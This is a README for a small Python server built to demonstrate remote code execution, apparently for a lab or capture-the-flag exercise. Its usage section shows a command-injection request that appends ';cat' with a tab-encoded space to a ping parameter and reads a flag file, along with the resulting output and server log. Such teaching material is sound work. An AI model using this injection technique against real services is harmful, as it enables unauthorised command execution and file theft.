# rce-endpoint
Simple python http server to demonstrate RCE vulnerabilities.

### Run
```
lomaha@rce-endpoint % python3 main.py -a=127.0.0.1 -p=80
```
### Use
#### Client side:
```
lomaha@rce-endpoint % curl -G "http://127.0.0.1/ping?ip=8.8.8.8;cat%09flag.txt"  
b'PING 8.8.8.8 (8.8.8.8): 56 data bytes\n64 bytes from 8.8.8.8: icmp_seq=0 ttl=114 time=7.279 ms\n64 bytes from 8.8.8.8: icmp_seq=1 ttl=114 time=6.343 ms\n64 bytes from 8.8.8.8: icmp_seq=2 ttl=111 time=7.965 ms\n\n--- 8.8.8.8 ping statistics ---\n3 packets transmitted, 3 packets received, 0.0% packet loss\nround-trip min/avg/max/stddev = 6.343/7.196/7.965/0.665 ms\nLOMAHA{cwhf85wLOMAHA4375023}'
```
#### Server side:
```
Server started http://127.0.0.1:80
127.0.0.1 - - [25/Dec/2021 19:44:32] "GET /ping?ip=8.8.8.8;cat%09flag.txt HTTP/1.1" 200 -
path: '/ping'
query_params: 'ip'
quer_value: '8.8.8.8;cat	flag.txt'
```